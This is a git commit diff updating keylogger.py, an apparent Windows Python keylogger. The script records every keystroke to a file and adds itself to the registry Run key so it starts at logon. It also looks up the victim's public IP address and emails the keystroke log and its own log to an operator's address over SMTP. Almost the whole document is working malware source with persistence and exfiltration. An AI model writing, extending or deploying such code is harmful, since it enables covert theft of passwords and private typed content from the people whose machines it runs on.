1aa0fe4e2cfeb4977a7bfb45b312706663ee4cd9
Matthew Blake <49418744+bmattblake@users.noreply.github.com>
2022-02-25 14:39:17 -0500

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,32 +1,82 @@
+import logging
+import smtplib
+import socket
+import urllib.request
+import sys
+import os
+import os.path
 from pynput.keyboard import Key, Listener
 from datetime import datetime
-import smtplib
 from os.path import basename
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
-import socket
 from win10toast import ToastNotifier
+from winreg import *
 
-EXIT_COMBINATION = {Key.ctrl_l, Key.f12}    # Press [LCTRL] + [F12] to stop keylogger
-PORT = 465                                  # Specify port number here (465 or 587 recommended)
-SMTP_SERVER = "smtp.gmail.com"              # Specify SMTP server here
+LOG_FORMAT = "%(levelname)s %(asctime)s %(message)s"
+logging.basicConfig(filename = "py-keylogger.log", level = logging.INFO, format = LOG_FORMAT, filemode = "w")
+logger = logging.getLogger()
+
+EXIT_COMBINATION = {Key.ctrl_l, Key.f12}    # Press [L CTRL] + [F12] to stop keylogger
+PORT = 465                                  # Specify port number (465 or 587 recommended)
+SMTP_SERVER = "smtp.gmail.com"              # Specify SMTP server
 TO_ADDR = "user@domain.com"                 # Specify recipient email address
 FROM_ADDR = "user@domain.com"               # Specify sender email address
 PASSWORD = "your_password"                  # Specify sender email account password
 HOSTNAME = socket.gethostname()
 SUBJECT = HOSTNAME + " // keylogger.py"     # Specify email subject
-CONTENT = "see keylog.txt attached"         # Specify email body
-active_keys = set()
+try:
+    PUBLIC_IP = urllib.request.urlopen('https://ident.me').read().decode('utf8')
+    email_logs = True
+    logger.info("Public ip address resolved")
+except urllib.error.URLError:
+    email_logs = False
+    PUBLIC_IP = None
+    logger.warning("https://ident.me could not be reached")
+    
+# Specify email body
+CONTENT = '''
+See keylogs.txt attached.
 
-# Record keystrokes in keylog.txt
+Sent from {}.'''.format(PUBLIC_IP)
+
+active_keys = set()
+# Record keystrokes in keylogs.txt
 def log(text):
-    with open("keylog.txt", "a") as f:
+    with open("keylogs.txt", "a") as f:
         f.write(str(text))
         f.close()
 
-# Send email with keylog.txt attached
-def email_log():
+# Add to system starup
+def add_startup():
+    # Get keylogger.py file path
+    file_path = os.path.dirname(os.path.realpath(__file__))
+    file_name = basename(sys.argv[0].split("\\")[-1])
+    complete_file_path = file_path + "\\" + file_name
+    
+    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    startup_key = OpenKey(HKEY_CURRENT_USER, key_path, 0, KEY_ALL_ACCESS)
+    added_to_startup = False
+    
+    # If keylogger.py entry exists, do not create entry again
+    with startup_key as hkey:
+        try:
+            for i in range(1024):
+                val = EnumValue(hkey, i)[0]
+                if val == "keylogger.py":
+                    logger.info("Script already added to Windows registry")
+                    added_to_startup = True
+                    break
+        except OSError:
+            pass
+        # If If keylogger.py entry does not exist, create a new entry
+        if added_to_startup == False:
+            SetValueEx(startup_key, "keylogger.py", 0, REG_SZ, f"\"{complete_file_path}\"")
+            logger.info("\"keylogger.py\" successfully added to Windows registry")
+
+# Send email with keylogs.txt attached
+def send_email():
     # Set messgae header and body
     msg = MIMEMultipart()
     msg["To"] = TO_ADDR
@@ -34,19 +84,30 @@ def email_log():
     msg["Subject"] = SUBJECT
     body = MIMEText(CONTENT, "plain")
     msg.attach(body)
+    logger.info("Email header and body constructed")
     
-    # Attach keylog.txt to email
-    file = "keylog.txt"
-    with open(file, "r") as f:
-        attachment = MIMEApplication(f.read(), Name = basename(file))
-        attachment["Content-Disposition"] = "attachment"; file = f"{basename(file)}"
-    msg.attach(attachment)
+    # Attach keylogs.txt to email
+    key_log = "keylogs.txt"
+    with open(key_log, "r") as f:
+        attachment1 = MIMEApplication(f.read(), Name = basename(key_log))
+        attachment1["Content-Disposition"] = "attachment"; key_log = f"{basename(key_log)}"
+    msg.attach(attachment1)
+    logger.info("\"keylogs.txt\" attached to email")
+    
+    # Attach py-keylogger.log to email
+    script_log = "py-keylogger.log"
+    with open(script_log, "r") as f:
+        attachment2 = MIMEApplication(f.read(), Name = basename(script_log))
+        attachment2["Content-Disposition"] = "attachment"; script_log = f"{basename(script_log)}"
+    msg.attach(attachment2)
+    logger.info("\"py-keylogger.log\" attached to email")
     
     # Connect to SMTP server and send message
     server = smtplib.SMTP_SSL(SMTP_SERVER, PORT)
     server.login(FROM_ADDR, PASSWORD)
+    logger.info(f"{FROM_ADDR} login successful")
     server.send_message(msg, from_addr = FROM_ADDR, to_addrs = [TO_ADDR])
-    print("Email Sent to ", TO_ADDR)
+    logger.info(f"Files sent from {FROM_ADDR} to {TO_ADDR}\n")
     server.quit()
 
 # Detect keystrokes
@@ -55,6 +116,7 @@ def on_press(key):
         active_keys.add(key)
         if all(k in active_keys for k in EXIT_COMBINATION):
             listener.stop()
+            logger.info("[KEYLOGGER STOP]")
 
     try:
         log(key.char)
@@ -76,9 +138,15 @@ def on_press(key):
 def on_release(key):
     pass
 
-# Clear previous log
-with open("keylog.txt", "w") as f:
-    f.close()
+
+
+logger.info("PKEYLOGGER START]")
+add_startup()
+
+# Clear previous log only if it has aready been sent via email
+if email_logs:
+    with open("keylogs.txt", "w") as f:
+        f.close()
 
 # Log start time and date
 start_date = datetime.now()
@@ -90,6 +158,7 @@ log("-----------------------------\n")
 log(f"Start Time: {start_date.hour}:{start_minute} {start_date.month}/{start_date.day}/{start_date.year}\n")
 log("-----------------------------\n")
 
+logger.info("Recording keystrokes...")
 with Listener(on_press = on_press, on_release = on_release) as listener:
     listener.join()
 
@@ -107,4 +176,5 @@ log("-----------------------------\n")
 # ToastNotifier().show_toast("Python Keylogger", "Keylogger stopped.", duration = 15)
 
 # Send email once log is closed
-email_log()
+if email_logs:
+    send_email()
